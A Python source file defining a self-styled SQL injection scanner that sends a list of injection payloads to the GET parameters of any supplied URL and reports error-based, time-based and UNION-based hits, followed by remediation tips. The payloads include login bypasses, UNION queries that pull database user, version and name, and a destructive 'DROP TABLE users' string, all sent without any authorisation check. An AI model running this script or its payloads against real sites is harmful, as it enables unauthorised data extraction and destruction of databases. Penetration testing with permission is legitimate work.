
import requests
import re
import urllib.parse
from bs4 import BeautifulSoup
import time
import random

def sql_injection_test(target_url):
    """
    Advanced SQL injection testing tool similar to SQLMap
    """
    results = []
    results.append("🔴 VAXYRO SQL INJECTION SCANNER")
    results.append("=" * 50)
    results.append(f"Target URL: {target_url}")
    results.append("")
    
    # Ensure URL has protocol
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    try:
        # SQL injection payloads
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 'x'='x",
            "1' AND SLEEP(5)--",
            "' OR '1'='1' /*",
            "admin'--",
            "admin' #",
            "' OR 1=1#",
            "') OR '1'='1--",
            "') OR ('1'='1--",
            "1' UNION SELECT 1,2,3--",
            "' UNION SELECT user(),version(),database()--",
            "1' AND 1=1--",
            "1' AND 1=2--"
        ]
        
        # Error-based detection patterns
        error_patterns = [
            r"mysql_fetch_array\(\)",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySQLSyntaxErrorException",
            r"Warning.*\Wmysql_.*",
            r"valid MySQL result",
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"Warning.*\W(mssql|sqlsrv)_.*",
            r"(SQLServer JDBC Driver|SqlException)",
            r"Warning.*sqlite_.*",
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            r"Warning.*fibird_.*",
            r"Dynamic SQL Error",
            r"Warning.*ibase_.*",
            r"org.postgresql.util.PSQLException",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"Warning.*ingres_.*",
            r"Warning.*sybase_.*"
        ]
        
        results.append("🔍 Testing for SQL injection vulnerabilities...")
        results.append("")
        
        # Parse URL to extract parameters
        parsed_url = urllib.parse.urlparse(target_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        params = urllib.parse.parse_qs(parsed_url.query)
        
        if not params:
            results.append("⚠️  No GET parameters found in URL")
            results.append("💡 Try adding parameters: ?id=1&page=home")
            return results
        
        vulnerable_params = []
        
        for param_name, param_values in params.items():
            results.append(f"🎯 Testing parameter: {param_name}")
            
            for payload in payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                test_url = base_url + "?" + urllib.parse.urlencode(test_params, doseq=True)
                
                try:
                    response = requests.get(test_url, timeout=10, allow_redirects=True)
                    
                    # Check for error-based SQL injection
                    for pattern in error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            results.append(f"🔴 HIGH: SQL Injection found in parameter '{param_name}'")
                            results.append(f"   Payload: {payload}")
                            results.append(f"   Error pattern detected: {pattern}")
                            vulnerable_params.append(param_name)
                            break
                    
                    # Check for time-based blind SQL injection
                    if "SLEEP(" in payload.upper():
                        start_time = time.time()
                        response = requests.get(test_url, timeout=15)
                        end_time = time.time()
                        
                        if end_time - start_time > 4:
                            results.append(f"🟡 MEDIUM: Possible time-based blind SQL injection in '{param_name}'")
                            results.append(f"   Payload: {payload}")
                            results.append(f"   Response time: {end_time - start_time:.2f}s")
                    
                    # Check response length differences
                    original_response = requests.get(target_url, timeout=10)
                    if abs(len(response.text) - len(original_response.text)) > 100:
                        results.append(f"🟡 MEDIUM: Response length variation detected in '{param_name}'")
                        results.append(f"   Original length: {len(original_response.text)}")
                        results.append(f"   Modified length: {len(response.text)}")
                    
                    # Small delay to avoid overwhelming the server
                    time.sleep(0.5)
                    
                except requests.exceptions.RequestException as e:
                    results.append(f"❌ Error testing payload '{payload}': {str(e)}")
                    continue
        
        # Advanced detection techniques
        results.append("")
        results.append("🔬 Advanced SQL injection tests...")
        
        # Union-based injection test
        for param_name in params.keys():
            union_payloads = [
                f"' UNION SELECT 1,2,3,4,5--",
                f"' UNION SELECT null,null,null--",
                f"' UNION ALL SELECT 1,2,3--"
            ]
            
            for payload in union_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                test_url = base_url + "?" + urllib.parse.urlencode(test_params, doseq=True)
                
                try:
                    response = requests.get(test_url, timeout=10)
                    if "1" in response.text and "2" in response.text and "3" in response.text:
                        results.append(f"🔴 HIGH: UNION-based SQL injection possible in '{param_name}'")
                        results.append(f"   Payload: {payload}")
                        break
                except:
                    continue
        
        # Summary
        results.append("")
        results.append("📊 SCAN SUMMARY")
        results.append("=" * 30)
        
        if vulnerable_params:
            results.append(f"🔴 Vulnerable parameters found: {', '.join(set(vulnerable_params))}")
            results.append("⚠️  CRITICAL: Immediate action required!")
            results.append("")
            results.append("🛠️  REMEDIATION STEPS:")
            results.append("   • Use parameterized queries/prepared statements")
            results.append("   • Implement input validation and sanitization")
            results.append("   • Use stored procedures with proper input handling")
            results.append("   • Apply the principle of least privilege to database accounts")
            results.append("   • Implement Web Application Firewall (WAF)")
        else:
            results.append("✅ No obvious SQL injection vulnerabilities detected")
            results.append("💡 Consider manual testing and code review for comprehensive security")
        
        results.append("")
        results.append("🔗 Additional Resources:")
        results.append("   • OWASP SQL Injection Prevention Cheat Sheet")
        results.append("   • Use SQLMap for more comprehensive testing")
        results.append("   • Implement Content Security Policy (CSP)")
        
    except requests.exceptions.RequestException as e:
        results.append(f"❌ Connection error: {str(e)}")
    except Exception as e:
        results.append(f"❌ Error during SQL injection test: {str(e)}")
    
    return results
